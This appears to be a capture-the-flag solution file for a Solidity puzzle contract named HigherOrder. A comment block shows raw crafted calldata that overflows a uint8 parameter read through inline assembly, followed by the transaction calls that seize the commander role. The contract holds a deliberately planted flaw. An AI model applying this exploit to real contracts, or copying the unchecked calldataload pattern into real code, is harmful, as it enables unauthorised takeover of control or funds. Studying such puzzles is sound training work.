// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}

/**
const calldata = web3.eth.abi.encodeFunctionCall({
  name: 'registerTreasury',
  type: 'function',
  inputs: [{ type: 'uint8', name: '' }]
}, ['0xff']);

    211c85ab
00: 000000000000000000000000000000000000000000000000000000000000ffff  //calldataload(4)读取的内容

var bypass = '0x211c85ab000000000000000000000000000000000000000000000000000000000000ffff'
await ethereum.request({
  method: 'eth_sendTransaction',
  params: [{
    from: player,
    to: instance,
    data: bypass
  }]
});
await contract.claimLeadership()

*/